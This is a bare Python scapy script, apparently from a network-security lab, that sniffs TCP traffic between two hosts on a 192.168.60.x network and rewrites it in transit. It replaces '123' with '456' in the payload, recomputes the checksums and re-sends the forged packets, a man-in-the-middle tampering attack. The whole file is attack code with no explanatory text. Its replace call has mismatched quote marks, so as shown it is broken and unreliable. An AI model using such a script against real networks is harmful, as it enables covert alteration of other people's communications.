#!/usr/bin/python3
from scapy.all import*
def spoof(pkt):
    if pkt[IP].src=="192.168.60.2"and pkt[TCP].payload :
      newpkt=IP(bytes(pkt[IP]))
      data=pkt[TCP].payload.load
      del(newpkt.chksum)
      del(newpkt[TCP].payload)
      del(newpkt[TCP].chksum)
      newdata=data.replace(b'123",b'456')
      send(newpkt/newdata)
f='tcp and(ether src 02:42:c0:a8:3c:02 or ether src 02:42:f1:77:03:bc)'
pkt=sniff(filter=f,prn=spoof)
